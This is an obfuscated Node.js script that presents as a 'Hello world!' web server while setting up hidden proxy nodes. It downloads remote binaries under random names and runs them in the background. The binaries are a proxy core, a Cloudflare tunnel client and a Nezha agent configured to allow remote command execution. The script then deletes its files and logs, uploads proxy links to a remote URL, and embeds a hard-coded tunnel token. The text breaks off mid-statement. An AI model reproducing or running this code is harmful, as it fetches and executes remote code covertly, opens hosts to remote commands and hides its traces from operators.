function _0x178d(){const _0x1d1221=['direct','Hello\x20world!','&fp=firefox&type=ws&host=','https+local://8.8.8.8/dns-query','\x20is\x20running','FILE_PATH','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','boot.log','CFIP','Add\x20automatic\x20access\x20task\x20faild:\x20','443','tunnel.json','web\x20running\x20error:\x20','?encryption=none&security=tls&sni=','stringify','vmess','\x20>\x20nul\x202>&1','substring','Error\x20in\x20startserver:','eyJhIjoiY2FmNzg3YWQ1ODk2NjAxZGNlN2ViYzBiMjc3ODU4NTUiLCJ0IjoiODMyNzZjNjItNmYxMS00MDg1LTlkNzItNTljN2NkY2I0NDNmIiwicyI6Ik5EUTVZekpoWmpBdFpqWmhZeTAwTlRrMkxXSTRNVEF0TUdVeU16bG1OMkptWm1FMSJ9','vless','includes','3GTSANg','freedom','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','set','config.json','http\x20server\x20is\x20running\x20on\x20port:','&path=%2Fvless-argo%3Fed%3D2560#','split','\x22\x20>\x20/dev/null\x202>&1','1256117HzwhMI','\x0a\x0avmess://','UUID','floor','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','readFileSync','error','random','Subscription\x20uploaded\x20successfully','createWriteStream','tunnel.yml','2053','https://ipapi.co/json/','/vmess-argo','/vless-argo','PORT','Download\x20','php\x20running\x20error:\x20','sub.txt','blackhole','cdns.doon.eu.org','catch','join','trojan','length','NAME','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','127.0.0.1','platform','fileName','org','true','mkdirSync','/api/delete-nodes','/config.json\x20>/dev/null\x202>&1\x20&','Error\x20executing\x20command:\x20','isFile','pipe','get','https://arm64.ssss.nyc.mn/bot','\x20>/dev/null\x202>&1\x20&','\x20successfully','abcdefghijklmnopqrstuvwxyz','writeFileSync','\x0a\x0atrojan://','AUTO_ACCESS','child_process','log','1716065BKiVTD','list.txt','tls','\x20failed:\x20','post','existsSync','1413186eSlKXT','2083','2087','toString','success','ARGO_AUTH','basename','push','rm\x20-rf\x20','match','application/json','del\x20/f\x20/q\x20','/api/add-subscriptions','?security=tls&sni=','Unknown','\x0a\x20\x20credentials-file:\x20','all','unshift','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','automatic\x20access\x20task\x20added\x20successfully','express','axios','\x20-c\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','92436yCZMPq','filter','20023992acBXCV','SUB_PATH','finish','Error\x20downloading\x20files:','/trojan-argo','\x0aclient_secret:\x20','Error\x20reading\x20boot.log:','xtls-rprx-vision','Empowerment\x20failed\x20for\x20','util','Unhandled\x20error\x20in\x20startserver:','Nodes\x20uploaded\x20successfully','NEZHA\x20variable\x20is\x20empty,skip\x20running','utf-8','from','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','firefox','Empowerment\x20success\x20for\x20','pkill\x20-f\x20\x22[','https://oooo.serv00.net/add-url','\x0a\x20\x20\x20\x20','NEZHA_KEY','/dev/null','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','status','92992682-7e57-41d0-99ee-2046191be2e4','data','\x0avless://','TunnelSecret','sub','none','base64','aarch64','https://amd64.ssss.nyc.mn/v1','block','config.yaml','CFPORT','arm64','3944269UIgtcm','\x20-p\x20','clear','charAt','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','pop','message','/api/add-nodes','country_code','nohup\x20','listen','unlinkSync','2096','NEZHA_PORT','fileUrl','App\x20is\x20running','https://arm64.ssss.nyc.mn/web','\x20>/dev/null\x202>&1','NEZHA_SERVER','map','\x20-s\x20','http','\x20is\x20created','arm','ArgoDomain:','7472358lvSRfM','--tls','text/plain;\x20charset=utf-8','false','forEach','env','close','\x0a\x20\x20tunnel:\x20','/vmess-argo?ed=2560','northflank','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tcp','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','ARGO_PORT','\x20-c\x20\x22','.exe\x20>\x20nul\x202>&1','https://amd64.ssss.nyc.mn/agent','http://ip-api.com/json/','UPLOAD_URL','statSync','has','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','countryCode','response','exec','win32'];_0x178d=function(){return _0x1d1221;};return _0x178d();}const _0x40226e=_0x15fc;(function(_0x5d7cc2,_0x20bc19){const _0x3b1264=_0x15fc,_0x42c310=_0x5d7cc2();while(!![]){try{const _0x1e158b=-parseInt(_0x3b1264(0x1d8))/0x1+-parseInt(_0x3b1264(0x20f))/0x2*(parseInt(_0x3b1264(0x1cf))/0x3)+parseInt(_0x3b1264(0x15d))/0x4+-parseInt(_0x3b1264(0x209))/0x5+parseInt(_0x3b1264(0x19e))/0x6+-parseInt(_0x3b1264(0x185))/0x7+parseInt(_0x3b1264(0x15f))/0x8;if(_0x1e158b===_0x20bc19)break;else _0x42c310['push'](_0x42c310['shift']());}catch(_0x234018){_0x42c310['push'](_0x42c310['shift']());}}}(_0x178d,0xdc3df));const express=require(_0x40226e(0x159)),app=express(),axios=require(_0x40226e(0x15a)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x40226e(0x168)),exec=promisify(require(_0x40226e(0x207))[_0x40226e(0x1b7)]),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x40226e(0x1b1)]||'',PROJECT_URL=process[_0x40226e(0x1a3)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x40226e(0x206)]||![],FILE_PATH=process[_0x40226e(0x1a3)][_0x40226e(0x1be)]||'./tmp',SUB_PATH=process[_0x40226e(0x1a3)][_0x40226e(0x160)]||_0x40226e(0x17c),PORT=process[_0x40226e(0x1a3)]['SERVER_PORT']||process[_0x40226e(0x1a3)][_0x40226e(0x1e7)]||0xbb8,UUID=process['env'][_0x40226e(0x1da)]||_0x40226e(0x178),NEZHA_SERVER=process[_0x40226e(0x1a3)][_0x40226e(0x197)]||'',NEZHA_PORT=process[_0x40226e(0x1a3)][_0x40226e(0x192)]||'',NEZHA_KEY=process['env'][_0x40226e(0x174)]||'',ARGO_DOMAIN=process[_0x40226e(0x1a3)]['ARGO_DOMAIN']||'north.bigc.de5.net',ARGO_AUTH=process[_0x40226e(0x1a3)][_0x40226e(0x14a)]||_0x40226e(0x1cc),ARGO_PORT=process[_0x40226e(0x1a3)][_0x40226e(0x1ac)]||0x1f41,CFIP=process[_0x40226e(0x1a3)][_0x40226e(0x1c1)]||_0x40226e(0x1ec),CFPORT=process[_0x40226e(0x1a3)][_0x40226e(0x183)]||0x1bb,NAME=process[_0x40226e(0x1a3)][_0x40226e(0x1f1)]||_0x40226e(0x1a7);!fs[_0x40226e(0x20e)](FILE_PATH)?(fs[_0x40226e(0x1f9)](FILE_PATH),console[_0x40226e(0x208)](FILE_PATH+_0x40226e(0x19b))):console[_0x40226e(0x208)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x2746da=_0x40226e,_0x2cefdb=_0x2746da(0x203);let _0x342baf='';for(let _0x119cf9=0x0;_0x119cf9<0x6;_0x119cf9++){_0x342baf+=_0x2cefdb[_0x2746da(0x188)](Math[_0x2746da(0x1db)](Math[_0x2746da(0x1df)]()*_0x2cefdb['length']));}return _0x342baf;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x40226e(0x1ee)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x40226e(0x1ee)](FILE_PATH,botName),subPath=path[_0x40226e(0x1ee)](FILE_PATH,_0x40226e(0x1ea)),listPath=path[_0x40226e(0x1ee)](FILE_PATH,_0x40226e(0x20a)),bootLogPath=path[_0x40226e(0x1ee)](FILE_PATH,_0x40226e(0x1c0)),configPath=path[_0x40226e(0x1ee)](FILE_PATH,_0x40226e(0x1d3));function deleteNodes(){const _0x3e3a06=_0x40226e;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x7185ba;try{_0x7185ba=fs[_0x3e3a06(0x1dd)](subPath,'utf-8');}catch{return null;}const _0x2395ab=Buffer[_0x3e3a06(0x16d)](_0x7185ba,_0x3e3a06(0x17e))[_0x3e3a06(0x148)](_0x3e3a06(0x16c)),_0x1eb9f6=_0x2395ab[_0x3e3a06(0x1d6)]('\x0a')['filter'](_0x2a0be8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2a0be8));if(_0x1eb9f6[_0x3e3a06(0x1f0)]===0x0)return;return axios[_0x3e3a06(0x20d)](UPLOAD_URL+_0x3e3a06(0x1fa),JSON[_0x3e3a06(0x1c7)]({'nodes':_0x1eb9f6}),{'headers':{'Content-Type':_0x3e3a06(0x14f)}})['catch'](_0x49e834=>{return null;}),null;}catch(_0xf77e7){return null;}}function cleanupOldFiles(){const _0x1d3d1b=_0x40226e;try{const _0x2f8724=fs['readdirSync'](FILE_PATH);_0x2f8724[_0x1d3d1b(0x1a2)](_0x149f66=>{const _0x2d8a75=_0x1d3d1b,_0x107984=path[_0x2d8a75(0x1ee)](FILE_PATH,_0x149f66);try{const _0x3f4f24=fs[_0x2d8a75(0x1b2)](_0x107984);_0x3f4f24[_0x2d8a75(0x1fd)]()&&fs[_0x2d8a75(0x190)](_0x107984);}catch(_0x2722a4){}});}catch(_0x460f4e){}}app[_0x40226e(0x1ff)]('/',function(_0x498846,_0x5814e2){const _0x38b180=_0x40226e;_0x5814e2['send'](_0x38b180(0x1ba));});async function generateConfig(){const _0x3bd1bb=_0x40226e,_0x2c4b19={'log':{'access':_0x3bd1bb(0x175),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3bd1bb(0x1cd),'settings':{'clients':[{'id':UUID,'flow':_0x3bd1bb(0x166)}],'decryption':_0x3bd1bb(0x17d),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x3bd1bb(0x1e5),'dest':0xbbb},{'path':_0x3bd1bb(0x163),'dest':0xbbc}]},'streamSettings':{'network':_0x3bd1bb(0x1aa)}},{'port':0xbb9,'listen':_0x3bd1bb(0x1f4),'protocol':_0x3bd1bb(0x1cd),'settings':{'clients':[{'id':UUID}],'decryption':_0x3bd1bb(0x17d)},'streamSettings':{'network':_0x3bd1bb(0x1aa),'security':'none'}},{'port':0xbba,'listen':_0x3bd1bb(0x1f4),'protocol':_0x3bd1bb(0x1cd),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x3bd1bb(0x17d),'wsSettings':{'path':_0x3bd1bb(0x1e6)}},'sniffing':{'enabled':!![],'destOverride':[_0x3bd1bb(0x19a),_0x3bd1bb(0x20b),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3bd1bb(0x1f4),'protocol':_0x3bd1bb(0x1c8),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3bd1bb(0x1e5)}},'sniffing':{'enabled':!![],'destOverride':[_0x3bd1bb(0x19a),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3bd1bb(0x1f4),'protocol':_0x3bd1bb(0x1ef),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3bd1bb(0x17d),'wsSettings':{'path':_0x3bd1bb(0x163)}},'sniffing':{'enabled':!![],'destOverride':[_0x3bd1bb(0x19a),_0x3bd1bb(0x20b),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x3bd1bb(0x1bc)]},'outbounds':[{'protocol':_0x3bd1bb(0x1d0),'tag':_0x3bd1bb(0x1b9)},{'protocol':_0x3bd1bb(0x1eb),'tag':_0x3bd1bb(0x181)}]};fs['writeFileSync'](path[_0x3bd1bb(0x1ee)](FILE_PATH,_0x3bd1bb(0x1d3)),JSON[_0x3bd1bb(0x1c7)](_0x2c4b19,null,0x2));}function getSystemArchitecture(){const _0x5b9160=_0x40226e,_0x163552=os['arch']();return _0x163552===_0x5b9160(0x19c)||_0x163552===_0x5b9160(0x184)||_0x163552===_0x5b9160(0x17f)?'arm':'amd';}function downloadFile(_0xf58d6,_0x380bdc,_0x2e301b){const _0x4f309c=_0x40226e,_0x3b045a=_0xf58d6;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x1536a2=fs[_0x4f309c(0x1e1)](_0x3b045a);axios({'method':'get','url':_0x380bdc,'responseType':'stream'})['then'](_0x5ebdae=>{const _0x51fe90=_0x4f309c;_0x5ebdae['data'][_0x51fe90(0x1fe)](_0x1536a2),_0x1536a2['on'](_0x51fe90(0x161),()=>{const _0x56f6a5=_0x51fe90;_0x1536a2[_0x56f6a5(0x1a4)](),console[_0x56f6a5(0x208)](_0x56f6a5(0x1e8)+path[_0x56f6a5(0x14b)](_0x3b045a)+_0x56f6a5(0x202)),_0x2e301b(null,_0x3b045a);}),_0x1536a2['on'](_0x51fe90(0x1de),_0x48c15a=>{const _0x7b1d29=_0x51fe90;fs['unlink'](_0x3b045a,()=>{});const _0x4b3a35=_0x7b1d29(0x1e8)+path['basename'](_0x3b045a)+_0x7b1d29(0x20c)+_0x48c15a[_0x7b1d29(0x18b)];console[_0x7b1d29(0x1de)](_0x4b3a35),_0x2e301b(_0x4b3a35);});})[_0x4f309c(0x1ed)](_0x233ed6=>{const _0x188470=_0x4f309c,_0x331bd2='Download\x20'+path['basename'](_0x3b045a)+_0x188470(0x20c)+_0x233ed6[_0x188470(0x18b)];console['error'](_0x331bd2),_0x2e301b(_0x331bd2);});}async function downloadFilesAndRun(){const _0x498b7c=_0x40226e,_0x226039=getSystemArchitecture(),_0x348552=getFilesForArchitecture(_0x226039);if(_0x348552[_0x498b7c(0x1f0)]===0x0){console['log'](_0x498b7c(0x1ab));return;}const _0x58e71c=_0x348552[_0x498b7c(0x198)](_0x2d7a28=>{return new Promise((_0xd06e96,_0x3f347a)=>{const _0x51afc3=_0x15fc;downloadFile(_0x2d7a28[_0x51afc3(0x1f6)],_0x2d7a28[_0x51afc3(0x193)],(_0x6240a4,_0x5bd6ef)=>{_0x6240a4?_0x3f347a(_0x6240a4):_0xd06e96(_0x5bd6ef);});});});try{await Promise[_0x498b7c(0x155)](_0x58e71c);}catch(_0x222e3f){console[_0x498b7c(0x1de)](_0x498b7c(0x162),_0x222e3f);return;}function _0x3268a2(_0x561d57){const _0x5c55ac=0x1fd;_0x561d57['forEach'](_0x571f1b=>{const _0x37f872=_0x15fc;fs[_0x37f872(0x20e)](_0x571f1b)&&fs['chmod'](_0x571f1b,_0x5c55ac,_0x5e0faa=>{const _0x5b53cf=_0x37f872;_0x5e0faa?console['error'](_0x5b53cf(0x167)+_0x571f1b+':\x20'+_0x5e0faa):console[_0x5b53cf(0x208)](_0x5b53cf(0x170)+_0x571f1b+':\x20'+_0x5c55ac[_0x5b53cf(0x148)](0x8));});});}const _0x479b32=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3268a2(_0x479b32);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x264596=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x498b7c(0x1d6)](':')[_0x498b7c(0x18a)]():'',_0x33cb01=new Set(['443','8443',_0x498b7c(0x191),_0x498b7c(0x147),_0x498b7c(0x146),_0x498b7c(0x1e3)]),_0x188b50=_0x33cb01[_0x498b7c(0x1b3)](_0x264596)?_0x498b7c(0x1f8):_0x498b7c(0x1a1),_0x24ccbe=_0x498b7c(0x164)+NEZHA_KEY+_0x498b7c(0x1a8)+NEZHA_SERVER+_0x498b7c(0x1b4)+_0x188b50+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x498b7c(0x204)](path[_0x498b7c(0x1ee)](FILE_PATH,_0x498b7c(0x182)),_0x24ccbe);const _0x254f32=_0x498b7c(0x18e)+phpPath+_0x498b7c(0x1ad)+FILE_PATH+_0x498b7c(0x1bf);try{await exec(_0x254f32),console[_0x498b7c(0x208)](phpName+_0x498b7c(0x1bd)),await new Promise(_0x4cdee8=>setTimeout(_0x4cdee8,0x3e8));}catch(_0x33342e){console[_0x498b7c(0x1de)](_0x498b7c(0x1e9)+_0x33342e);}}else{let _0x2b75da='';const _0x5c4b14=[_0x498b7c(0x1c3),'8443','2096',_0x498b7c(0x147),'2083','2053'];_0x5c4b14[_0x498b7c(0x1ce)](NEZHA_PORT)&&(_0x2b75da=_0x498b7c(0x19f));const _0xe9c40d=_0x498b7c(0x18e)+npmPath+_0x498b7c(0x199)+NEZHA_SERVER+':'+NEZHA_PORT+_0x498b7c(0x186)+NEZHA_KEY+'\x20'+_0x2b75da+_0x498b7c(0x176);try{await exec(_0xe9c40d),console[_0x498b7c(0x208)](npmName+_0x498b7c(0x1bd)),await new Promise(_0x4b98d1=>setTimeout(_0x4b98d1,0x3e8));}catch(_0x50f412){console[_0x498b7c(0x1de)]('npm\x20running\x20error:\x20'+_0x50f412);}}}else console[_0x498b7c(0x208)](_0x498b7c(0x16b));const _0x26ddac='nohup\x20'+webPath+_0x498b7c(0x15b)+FILE_PATH+_0x498b7c(0x1fb);try{await exec(_0x26ddac),console[_0x498b7c(0x208)](webName+_0x498b7c(0x1bd)),await new Promise(_0x26c83f=>setTimeout(_0x26c83f,0x3e8));}catch(_0xc50c87){console[_0x498b7c(0x1de)](_0x498b7c(0x1c5)+_0xc50c87);}if(fs['existsSync'](botPath)){let _0x77d4df;if(ARGO_AUTH[_0x498b7c(0x14e)](/^[A-Z0-9a-z=]{120,250}$/))_0x77d4df=_0x498b7c(0x15c)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x77d4df=_0x498b7c(0x16e)+FILE_PATH+'/tunnel.yml\x20run':_0x77d4df=_0x498b7c(0x189)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x498b7c(0x18e)+botPath+'\x20'+_0x77d4df+'\x20>/dev/null\x202>&1\x20&'),console[_0x498b7c(0x208)](botName+_0x498b7c(0x1bd)),await new Promise(_0x21377b=>setTimeout(_0x21377b,0x7d0));}catch(_0x4e67b2){console[_0x498b7c(0x1de)](_0x498b7c(0x1fc)+_0x4e67b2);}}await new Promise(_0x23bb1d=>setTimeout(_0x23bb1d,0x1388));}function getFilesForArchitecture(_0x1d03bf){const _0x46a790=_0x40226e;let _0x320acd;_0x1d03bf===_0x46a790(0x19c)?_0x320acd=[{'fileName':webPath,'fileUrl':_0x46a790(0x195)},{'fileName':botPath,'fileUrl':_0x46a790(0x200)}]:_0x320acd=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2f54d5=_0x1d03bf===_0x46a790(0x19c)?'https://arm64.ssss.nyc.mn/agent':_0x46a790(0x1af);_0x320acd[_0x46a790(0x156)]({'fileName':npmPath,'fileUrl':_0x2f54d5});}else{const _0x1fa58f=_0x1d03bf===_0x46a790(0x19c)?'https://arm64.ssss.nyc.mn/v1':_0x46a790(0x180);_0x320acd[_0x46a790(0x156)]({'fileName':phpPath,'fileUrl':_0x1fa58f});}}return _0x320acd;}function argoType(){const _0x3a91e1=_0x40226e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3a91e1(0x208)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x3a91e1(0x1ce)](_0x3a91e1(0x17b))){fs[_0x3a91e1(0x204)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x43df6b=_0x3a91e1(0x1a5)+ARGO_AUTH[_0x3a91e1(0x1d6)]('\x22')[0xb]+_0x3a91e1(0x154)+path[_0x3a91e1(0x1ee)](FILE_PATH,_0x3a91e1(0x1c4))+_0x3a91e1(0x1f3)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x3a91e1(0x1d1);fs[_0x3a91e1(0x204)](path[_0x3a91e1(0x1ee)](FILE_PATH,_0x3a91e1(0x1e2)),_0x43df6b);}else console[_0x3a91e1(0x208)](_0x3a91e1(0x1a9));}async function extractDomains(){const _0x466205=_0x40226e;let _0x282344;if(ARGO_AUTH&&ARGO_DOMAIN)_0x282344=ARGO_DOMAIN,console[_0x466205(0x208)]('ARGO_DOMAIN:',_0x282344),await _0x7baf65(_0x282344);else try{const _0xcd12b2=fs['readFileSync'](path['join'](FILE_PATH,'boot.log'),_0x466205(0x16c)),_0x432b57=_0xcd12b2[_0x466205(0x1d6)]('\x0a'),_0x550b83=[];_0x432b57[_0x466205(0x1a2)](_0x5bb18f=>{const _0x137321=_0x466205,_0x169d72=_0x5bb18f[_0x137321(0x14e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x169d72){const _0x3aa597=_0x169d72[0x1];_0x550b83[_0x137321(0x14c)](_0x3aa597);}});if(_0x550b83[_0x466205(0x1f0)]>0x0)_0x282344=_0x550b83[0x0],console[_0x466205(0x208)](_0x466205(0x19d),_0x282344),await _0x7baf65(_0x282344);else{console[_0x466205(0x208)](_0x466205(0x157)),fs['unlinkSync'](path[_0x466205(0x1ee)](FILE_PATH,_0x466205(0x1c0)));async function _0x84d68(){const _0x264e5c=_0x466205;try{process[_0x264e5c(0x1f5)]===_0x264e5c(0x1b8)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x264e5c(0x1ae)):await exec(_0x264e5c(0x171)+botName['charAt'](0x0)+']'+botName[_0x264e5c(0x1ca)](0x1)+_0x264e5c(0x1d7));}catch(_0x454f85){}}_0x84d68(),await new Promise(_0x5e1a66=>setTimeout(_0x5e1a66,0xbb8));const _0x35296b='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x466205(0x1f2)+ARGO_PORT;try{await exec(_0x466205(0x18e)+botPath+'\x20'+_0x35296b+_0x466205(0x201)),console[_0x466205(0x208)](botName+_0x466205(0x1bd)),await new Promise(_0x16b915=>setTimeout(_0x16b915,0xbb8)),await extractDomains();}catch(_0x2cf9e4){console[_0x466205(0x1de)](_0x466205(0x1fc)+_0x2cf9e4);}}}catch(_0x398d6c){console[_0x466205(0x1de)](_0x466205(0x165),_0x398d6c);}async function _0x1d2eaf(){const _0x2b7997=_0x466205;try{const _0x1b3859=await axios[_0x2b7997(0x1ff)](_0x2b7997(0x1e4),{'timeout':0xbb8});if(_0x1b3859['data']&&_0x1b3859[_0x2b7997(0x179)][_0x2b7997(0x18d)]&&_0x1b3859[_0x2b7997(0x179)][_0x2b7997(0x1f7)])return _0x1b3859['data'][_0x2b7997(0x18d)]+'_'+_0x1b3859['data'][_0x2b7997(0x1f7)];}catch(_0xbee918){try{const _0x349aa8=await axios[_0x2b7997(0x1ff)](_0x2b7997(0x1b0),{'timeout':0xbb8});if(_0x349aa8[_0x2b7997(0x179)]&&_0x349aa8['data'][_0x2b7997(0x177)]===_0x2b7997(0x149)&&_0x349aa8[_0x2b7997(0x179)][_0x2b7997(0x1b5)]&&_0x349aa8[_0x2b7997(0x179)][_0x2b7997(0x1f7)])return _0x349aa8[_0x2b7997(0x179)][_0x2b7997(0x1b5)]+'_'+_0x349aa8[_0x2b7997(0x179)]['org'];}catch(_0x32a6b4){}}return _0x2b7997(0x153);}async function _0x7baf65(_0x378e81){const _0x58a38e=await _0x1d2eaf(),_0x173703=NAME?NAME+'-'+_0x58a38e:_0x58a38e;return new Promise(_0x3f6531=>{setTimeout(()=>{const _0x27a46c=_0x15fc,_0x23298d={'v':'2','ps':''+_0x173703,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x27a46c(0x17d),'net':'ws','type':'none','host':_0x378e81,'path':_0x27a46c(0x1a6),'tls':'tls','sni':_0x378e81,'alpn':'','fp':_0x27a46c(0x16f)},_0x4575aa=_0x27a46c(0x17a)+UUID+'@'+CFIP+':'+CFPORT+_0x27a46c(0x1c6)+_0x378e81+'&fp=firefox&type=ws&host='+_0x378e81+_0x27a46c(0x1d5)+_0x173703+_0x27a46c(0x1d9)+Buffer[_0x27a46c(0x16d)](JSON[_0x27a46c(0x1c7)](_0x23298d))[_0x27a46c(0x148)](_0x27a46c(0x17e))+_0x27a46c(0x205)+UUID+'@'+CFIP+':'+CFPORT+_0x27a46c(0x152)+_0x378e81+_0x27a46c(0x1bb)+_0x378e81+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x173703+_0x27a46c(0x173);console[_0x27a46c(0x208)](Buffer[_0x27a46c(0x16d)](_0x4575aa)[_0x27a46c(0x148)]('base64')),fs[_0x27a46c(0x204)](subPath,Buffer[_0x27a46c(0x16d)](_0x4575aa)[_0x27a46c(0x148)](_0x27a46c(0x17e))),console[_0x27a46c(0x208)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x27a46c(0x1ff)]('/'+SUB_PATH,(_0x22321c,_0x48577c)=>{const _0x285f56=_0x27a46c,_0x3ab942=Buffer[_0x285f56(0x16d)](_0x4575aa)[_0x285f56(0x148)](_0x285f56(0x17e));_0x48577c[_0x285f56(0x1d2)]('Content-Type',_0x285f56(0x1a0)),_0x48577c['send'](_0x3ab942);}),_0x3f6531(_0x4575aa);},0x7d0);});}}function _0x15fc(_0x4f186e,_0x5e30b3){_0x4f186e=_0x4f186e-0x146;const _0x178d37=_0x178d();let _0x15fc1a=_0x178d37[_0x4f186e];return _0x15fc1a;}async function uploadNodes(){const _0x19c1f=_0x40226e;if(UPLOAD_URL&&PROJECT_URL){const _0x42bb33=PROJECT_URL+'/'+SUB_PATH,_0x2f67d0={'subscription':[_0x42bb33]};try{const _0x2135c7=await axios[_0x19c1f(0x20d)](UPLOAD_URL+_0x19c1f(0x151),_0x2f67d0,{'headers':{'Content-Type':_0x19c1f(0x14f)}});return _0x2135c7&&_0x2135c7[_0x19c1f(0x177)]===0xc8?(console[_0x19c1f(0x208)](_0x19c1f(0x1e0)),_0x2135c7):null;}catch(_0x4a0807){if(_0x4a0807[_0x19c1f(0x1b6)]){if(_0x4a0807['response'][_0x19c1f(0x177)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x19c1f(0x20e)](listPath))return;const _0x131423=fs[_0x19c1f(0x1dd)](listPath,_0x19c1f(0x16c)),_0x36f124=_0x131423[_0x19c1f(0x1d6)]('\x0a')[_0x19c1f(0x15e)](_0x159fee=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x159fee));if(_0x36f124[_0x19c1f(0x1f0)]===0x0)return;const _0x29f817=JSON[_0x19c1f(0x1c7)]({'nodes':_0x36f124});try{const _0x267985=await axios['post'](UPLOAD_URL+_0x19c1f(0x18c),_0x29f817,{'headers':{'Content-Type':_0x19c1f(0x14f)}});return _0x267985&&_0x267985['status']===0xc8?(console['log'](_0x19c1f(0x16a)),_0x267985):null;}catch(_0x3de79d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4a25b4=_0x15fc,_0x262fb4=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x262fb4['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x262fb4[_0x4a25b4(0x14c)](phpPath);process['platform']===_0x4a25b4(0x1b8)?exec(_0x4a25b4(0x150)+_0x262fb4[_0x4a25b4(0x1ee)]('\x20')+_0x4a25b4(0x1c9),_0x698507=>{const _0x599a46=_0x4a25b4;console[_0x599a46(0x187)](),console['log'](_0x599a46(0x194)),console['log'](_0x599a46(0x1dc));}):exec(_0x4a25b4(0x14d)+_0x262fb4['join']('\x20')+_0x4a25b4(0x196),_0x49db56=>{const _0xb8f6a7=_0x4a25b4;console[_0xb8f6a7(0x187)](),console['log'](_0xb8f6a7(0x194)),console[_0xb8f6a7(0x208)](_0xb8f6a7(0x1dc));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x197bb2=_0x40226e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x197bb2(0x208)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x1d0923=await axios[_0x197bb2(0x20d)](_0x197bb2(0x172),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x197bb2(0x14f)}});return console[_0x197bb2(0x208)](_0x197bb2(0x158)),_0x1d0923;}catch(_0xb767c5){return console[_0x197bb2(0x1de)](_0x197bb2(0x1c2)+_0xb767c5['message']),null;}}async function startserver(){const _0xea33ce=_0x40226e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 